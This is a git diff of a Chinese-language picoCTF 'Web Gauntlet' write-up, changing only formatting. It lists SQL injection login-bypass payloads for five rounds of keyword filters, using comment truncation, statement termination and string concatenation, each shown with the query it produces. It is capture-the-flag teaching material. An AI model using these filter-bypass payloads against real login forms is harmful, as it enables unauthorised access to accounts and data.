@@ -1,9 +1,9 @@
 ---
-title: 'Web Gauntlet'
-description: ''
-pubDate: '2026-05-06T11:00:00+08:00'
-tags: ['picoCTF', 'Web', 'SQL Injection']
-category: 'WriteUp'
+title: "Web Gauntlet"
+description: ""
+pubDate: "2026-05-06T11:00:00+08:00"
+tags: ["picoCTF", "Web", "SQL Injection"]
+category: "WriteUp"
 ---
 
 - 分類：Web
@@ -16,40 +16,55 @@ category: 'WriteUp'
 
 1. 題目說 Log in as admin，所以要登入的 username 是 `admin`
 2. 第一題被擋的是 `or`
+
 ```
 admin' --
 ```
+
 ```sql
 SELECT * FROM users WHERE username='admin' --' AND password='123'
 ```
+
 3. 第二題被擋的是 `or` `and` `like` `=` `--`
+
 ```
 admin' /*
 ```
+
 ```sql
 SELECT * FROM users WHERE username='admin' /*' AND password='123'
 ```
+
 4. 第三題被擋的是 `or` `and` `=` `like` `>` `<` `--`，但有點不清楚為何 `/* ... */` 會被擋
+
 ```
 admin';
 ```
+
 ```sql
 SELECT * FROM users WHERE username='admin';' AND password='123'
 ```
+
 5. 第四題被擋的是 `or` `and` `=` `like` `>` `<` `--` `admin`，`admin` 被擋，那就用字串連接
+
 ```
 ad'||'min';
 ```
+
 ```sql
 SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
 ```
+
 6. 第五題被擋的是 `or` `and` `=` `like` `>` `<` `--` `union` `admin`，`union` 被擋，那就跟上一個 payload 一樣
+
 ```
 ad'||'min';
 ```
+
 ```sql
 SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
 ```
+
 7. 最後題目把 filter.php 過濾的檔案秀出來了
 
 ```php showLineNumbers {47}
